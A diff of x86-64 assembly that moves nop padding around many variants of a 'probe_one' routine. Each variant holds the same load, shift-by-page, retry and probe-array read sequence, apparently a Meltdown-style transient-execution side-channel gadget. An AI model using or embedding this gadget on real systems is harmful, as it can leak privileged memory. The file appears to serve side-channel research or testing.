 	jmp	.Lprobe_one_win0_continue
 ## Variant 86
@@ -2400,13 +2400,13 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 87
@@ -2417,26 +2417,26 @@ probe_one:
 	nop
 	nop
 	nop
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 88
 .Lprobe_one_win0_var88:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 89
@@ -2444,12 +2444,12 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
-	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	nop
@@ -2458,61 +2458,61 @@ probe_one:
 .Lprobe_one_win0_var90:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
-	nop
 	nop
 	nop
 	shlq	$0xc, %rax
 	nop
-	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	jz	92b
+	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 91
 .Lprobe_one_win0_var91:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
-	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	jz	92b
+	nop
+	nop
+	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 92
 .Lprobe_one_win0_var92:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
+	nop
+	nop
+	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 93
 .Lprobe_one_win0_var93:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 94
 .Lprobe_one_win0_var94:
@@ -2522,12 +2522,12 @@ probe_one:
 	nop
 	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 95
 .Lprobe_one_win0_var95:
@@ -2538,10 +2538,10 @@ probe_one:
 	jz	92b
 	nop
 	nop
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 96
@@ -2550,71 +2550,71 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
+	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 97
 .Lprobe_one_win0_var97:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 98
 .Lprobe_one_win0_var98:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
 	nop
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 99
 .Lprobe_one_win0_var99:
 	popq	%rax
 	addq	$32, %rsp
-	movb	(%rdx), %al
 	nop
+	nop
+	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
 	nop
 	jz	92b
 	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 100
 .Lprobe_one_win0_var100:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	nop
 	nop
@@ -2625,13 +2625,13 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
-	movb	(%rdx), %al
 	nop
+	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
 	nop
-	jz	92b
 	nop
+	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 102
@@ -2641,28 +2641,28 @@ probe_one:
 	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
-	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	nop
+	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 103
 .Lprobe_one_win0_var103:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
 	jz	92b
 	nop
 	nop
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 104
 .Lprobe_one_win0_var104:
@@ -2670,12 +2670,12 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -2686,11 +2686,11 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
-	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -2698,16 +2698,16 @@ probe_one:
 .Lprobe_one_win0_var106:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
 	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 107
 .Lprobe_one_win0_var107:
@@ -2717,9 +2717,9 @@ probe_one:
 	nop
 	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -2728,36 +2728,37 @@ probe_one:
 .Lprobe_one_win0_var108:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 109
 .Lprobe_one_win0_var109:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 110
 .Lprobe_one_win0_var110:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	nop
 	movb	(%rdx), %al
 	nop
@@ -2765,7 +2766,6 @@ probe_one:
 	nop
 	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -2773,29 +2773,29 @@ probe_one:
 .Lprobe_one_win0_var111:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	jz	92b
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 112
 .Lprobe_one_win0_var112:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
+	nop
+	nop
 	jz	92b
+	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -2803,16 +2803,16 @@ probe_one:
 .Lprobe_one_win0_var113:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 114
 .Lprobe_one_win0_var114:
@@ -2836,13 +2836,13 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 116
 .Lprobe_one_win0_var116:
@@ -2850,44 +2850,44 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 117
 .Lprobe_one_win0_var117:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 118
 .Lprobe_one_win0_var118:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
+	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 119
 .Lprobe_one_win0_var119:
@@ -2896,12 +2896,12 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	nop
+	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 120
@@ -2909,44 +2909,44 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 121
 .Lprobe_one_win0_var121:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	nop
 	jz	92b
 	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 122
 .Lprobe_one_win0_var122:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
 	jz	92b
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 123
@@ -2954,44 +2954,44 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
-	nop
-	nop
-	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 124
 .Lprobe_one_win0_var124:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 125
 .Lprobe_one_win0_var125:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 126
@@ -2999,14 +2999,14 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 127
@@ -3016,8 +3016,8 @@ probe_one:
 	nop
 	nop
 	nop
-	movb	(%rdx), %al
 	nop
+	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
 	nop
@@ -3029,15 +3029,15 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 129
 .Lprobe_one_win0_var129:
@@ -3046,25 +3046,25 @@ probe_one:
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
-	nop
 	jz	92b
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 130
 .Lprobe_one_win0_var130:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
 	nop
@@ -3073,46 +3073,46 @@ probe_one:
 .Lprobe_one_win0_var131:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
-	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	nop
+	nop
+	jz	92b
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 132
 .Lprobe_one_win0_var132:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 133
 .Lprobe_one_win0_var133:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 134
 .Lprobe_one_win0_var134:
@@ -3121,23 +3121,23 @@ probe_one:
 	nop
 	movb	(%rdx), %al
 	nop
-	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 135
 .Lprobe_one_win0_var135:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -3150,14 +3150,14 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 137
 .Lprobe_one_win0_var137:
@@ -3166,27 +3166,27 @@ probe_one:
 	nop
 	nop
 	nop
+	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 138
 .Lprobe_one_win0_var138:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
+	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 139
@@ -3195,41 +3195,41 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 140
 .Lprobe_one_win0_var140:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 141
 .Lprobe_one_win0_var141:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
-	jz	92b
 	nop
+	nop
+	nop
+	nop
+	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	nop
@@ -3238,16 +3238,16 @@ probe_one:
 .Lprobe_one_win0_var142:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
-	jz	92b
 	nop
+	nop
+	nop
+	nop
+	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 143
 .Lprobe_one_win0_var143:
@@ -3256,11 +3256,11 @@ probe_one:
 	nop
 	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
+	nop
+	nop
+	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -3270,28 +3270,28 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 145
 .Lprobe_one_win0_var145:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 146
@@ -3302,12 +3302,12 @@ probe_one:
 	nop
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
-	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 147
 .Lprobe_one_win0_var147:
@@ -3315,14 +3315,14 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 148
 .Lprobe_one_win0_var148:
@@ -3330,14 +3330,14 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
+	nop
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 149
 .Lprobe_one_win0_var149:
@@ -3345,58 +3345,58 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 150
 .Lprobe_one_win0_var150:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
 	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 151
 .Lprobe_one_win0_var151:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
-	jz	92b
 	nop
+	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 152
 .Lprobe_one_win0_var152:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 153
@@ -3405,27 +3405,27 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
-	nop
 	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 154
 .Lprobe_one_win0_var154:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -3434,43 +3434,43 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 156
 .Lprobe_one_win0_var156:
 	popq	%rax
 	addq	$32, %rsp
-	movb	(%rdx), %al
 	nop
+	nop
+	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
 	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 157
 .Lprobe_one_win0_var157:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -3481,37 +3481,37 @@ probe_one:
 	nop
 	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
-	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	jz	92b
+	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 159
 .Lprobe_one_win0_var159:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
 	nop
-	shlq	$0xc, %rax
 	nop
+	shlq	$0xc, %rax
 	jz	92b
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 160
 .Lprobe_one_win0_var160:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	nop
 	shlq	$0xc, %rax
 	nop
@@ -3523,31 +3523,31 @@ probe_one:
 .Lprobe_one_win0_var161:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	nop
 	shlq	$0xc, %rax
 	nop
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 162
 .Lprobe_one_win0_var162:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	nop
 	shlq	$0xc, %rax
 	nop
-	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 163
 .Lprobe_one_win0_var163:
@@ -3557,10 +3557,10 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -3570,14 +3570,14 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
-	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 165
 .Lprobe_one_win0_var165:
@@ -3585,89 +3585,89 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
-	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 166
 .Lprobe_one_win0_var166:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 167
 .Lprobe_one_win0_var167:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	nop
-	nop
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 168
 .Lprobe_one_win0_var168:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
-	shlq	$0xc, %rax
 	nop
+	shlq	$0xc, %rax
 	jz	92b
 	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 169
 .Lprobe_one_win0_var169:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
 	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 170
 .Lprobe_one_win0_var170:
 	popq	%rax
 	addq	$32, %rsp
-	movb	(%rdx), %al
 	nop
+	nop
+	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 171
